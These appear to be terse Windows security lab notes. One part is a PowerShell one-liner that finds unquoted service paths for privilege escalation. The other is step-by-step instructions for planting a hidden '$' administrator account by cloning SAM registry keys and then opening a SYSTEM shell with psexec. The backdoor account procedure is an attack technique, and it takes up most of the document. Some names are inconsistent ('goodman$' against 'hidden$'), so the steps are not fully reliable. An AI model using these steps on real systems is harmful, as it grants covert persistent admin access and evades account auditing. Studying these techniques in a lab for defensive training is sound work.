# Lab2
---
## Lab 2_1 find the unquoated service
- get-wmiobject win32_service | ?{$_.pathname -match <mark>"^`"{0,1}(C|c):*\\.*\s+.*\\.*"</mark>} | select Name, Pathname, State, ProcessID
- get-acl

---
## Lab2__2 Hidden account
1. net user goodman$ <passwd> /add
1. Export regedit 
    1. sam\domains\account\users\names\goodman$ as name.reg
    1. sam\domains\account\users\<admimistrator_id> as rource.reg
    1. sam\domains\account\users\<goodman$____id> as target.reg
1. Delete goodman$ account
1. Import sam and user reg: regedit /s <xxx>.reg
1. Us PSexec to get system cmd
    1. psexec -u hidden$ -p <passwd> cmd
    1. psexec -i-s cmd
